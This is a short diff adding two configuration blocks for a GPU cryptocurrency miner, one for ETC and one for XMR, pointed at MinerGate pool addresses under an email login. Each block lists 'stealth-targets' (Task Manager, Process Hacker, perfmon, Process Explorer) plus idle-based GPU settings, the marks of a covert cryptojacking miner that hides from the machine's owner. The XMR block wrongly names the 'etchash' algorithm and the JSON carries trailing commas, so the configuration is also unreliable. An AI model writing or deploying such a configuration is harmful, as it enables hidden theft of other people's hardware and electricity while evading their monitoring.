@@ -1,0 +1,20 @@
+ETC
+
+{
+    "url": "stratum+tcp://etc.pool.minergate.com:45777/xdxd13121@gmail.com",
+    "algo": "etchash",
+    "max-gpu": 50,
+    "idle-wait": 3,
+    "idle-gpu": 100,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+}
+
+XMR
+{
+    "url": "stratum+tcp://xmr.pool.minergate.com:45700/xdxd13121@gmail.com",
+    "algo": "etchash",
+    "max-gpu": 50,
+    "idle-wait": 3,
+    "idle-gpu": 100,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+}
